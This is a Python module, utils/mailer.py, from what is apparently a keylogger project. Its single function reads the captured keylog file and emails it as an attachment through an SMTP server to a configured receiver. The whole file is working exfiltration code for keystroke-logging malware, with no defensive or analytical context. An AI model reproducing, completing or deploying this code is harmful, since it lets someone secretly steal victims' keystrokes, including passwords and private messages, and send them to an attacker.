# utils/mailer.py

import smtplib
import os
from email.message import EmailMessage
from config import LOG_FILE_PATH, EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER, SMTP_SERVER, SMTP_PORT

def send_email_with_log():
    """
    Sends the keylog file via email as an attachment.
    """
    if not os.path.exists(LOG_FILE_PATH):
        print("[!] Log file does not exist.")
        return

    # Create the email message
    msg = EmailMessage()
    msg['Subject'] = 'Keylogger Log File'
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER

    msg.set_content('Attached is the keylogger log file.')

    # Read and attach the log file
    with open(LOG_FILE_PATH, 'rb') as f:
        file_data = f.read()
        file_name = os.path.basename(LOG_FILE_PATH)
        msg.add_attachment(file_data, maintype='text', subtype='plain', filename=file_name)

    # Send email using SMTP
    try:
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as smtp:
            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
            smtp.send_message(msg)
            print("[✓] Email sent successfully.")
    except Exception as e:
        print(f"[✗] Failed to send email: {e}")